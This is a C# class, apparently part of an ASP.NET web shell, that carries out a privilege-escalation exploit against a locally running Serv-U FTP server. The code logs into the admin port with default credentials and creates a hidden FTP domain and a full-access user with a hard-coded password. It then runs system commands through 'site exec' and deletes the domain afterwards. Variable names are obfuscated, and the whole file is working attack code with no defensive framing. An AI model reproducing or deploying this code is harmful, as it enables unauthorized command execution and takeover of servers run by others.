using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Web;
using System.Web.Security;


namespace MyModel
{
    public class SuEXP
    {
        HttpApplication ha = null;
        TcpClient zvxm = new TcpClient();
        public SuEXP(HttpApplication http)
        {
            ha = http;
        }
        string str = "";
        
        TcpClient tcp = new TcpClient();
        public NetworkStream NS = null;
        public NetworkStream NS1 = null;
        /// <summary>
        /// 网络流处理1
        /// </summary>
        /// <param name="instream"></param>
        /// <param name="Sendstr"></param>
        protected void ZJiM(NetworkStream instream, string Sendstr)
        {
            if (instream.CanWrite)
            {
                byte[] uPZ = Encoding.Default.GetBytes(Sendstr);
                instream.Write(uPZ, 0, uPZ.Length);
            }
            str += "<font color=blue>" + Sendstr + "</font>";
        }

        /// <summary>
        /// 网络流处理2
        /// </summary>
        /// <param name="instream"></param>
        protected void Rev(NetworkStream instream)
        {
            string FTBtf = string.Empty;
            if (instream.CanRead)
            {
                byte[] uPZ = new byte[1024];
                do
                {
                    
                    System.Threading.Thread.Sleep(50);
                    int len = instream.Read(uPZ, 0, uPZ.Length);
                    FTBtf += Encoding.Default.GetString(uPZ, 0, len);
                }
                while (instream.DataAvailable);
            }
            str += "<font color=red>" + FTBtf.Replace("\0", "") + "</font>";
        }

        /// <summary>
        /// 执行SU提权
        /// </summary>
        public string EXECMD()
        {
            string JGGg = string.Empty;
            string user = "localadministrator";
            string pass = @"#l@$ak#.lk;0@P";
            int port = Int32.Parse("43958");
            string cmd = @"cmd.exe /c net user";
            string CRtK = "user " + user + "\r\n";
            string jnNG = "pass " + pass + "\r\n";
            string site = "SITE MAINTENANCE\r\n";
            string mtoJb = "-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n";
            string sutI = "-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
            string iVDT = "-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";
            string zexn = "QUIT\r\n";
            try
            {
                tcp.Connect("127.0.0.1", port);
                tcp.ReceiveBufferSize = 1024;
                NS = tcp.GetStream();
                Rev(NS);
                ZJiM(NS, CRtK);
                Rev(NS);
                ZJiM(NS, jnNG);
                Rev(NS);
                ZJiM(NS, site);
                Rev(NS);
                ZJiM(NS, mtoJb);
                Rev(NS);
                ZJiM(NS, sutI);
                Rev(NS);
                ZJiM(NS, iVDT);
                Rev(NS);
                str += "<font color=\"green\"><b>Exec Cmd.................\r\n</b></font>";
               
                zvxm.Connect(ha.Request.ServerVariables["LOCAL_ADDR"], 52521);

                NS1 = zvxm.GetStream();
                Rev(NS1);
                ZJiM(NS1, "user bin\r\n");
                Rev(NS1);
                ZJiM(NS1, "pass binftp\r\n");
                Rev(NS1);
                ZJiM(NS1, "site exec " + cmd + "\r\n");
                Rev(NS1);
                ZJiM(NS1, "quit\r\n");
                Rev(NS1);
                zvxm.Close();
                ZJiM(NS, mtoJb);
                Rev(NS);
                tcp.Close();
            }
            catch (Exception error)
            {
                str += "错误信息:" + error;
                //xseuB(error.Message);
            }
            return str;
        }
    }


}
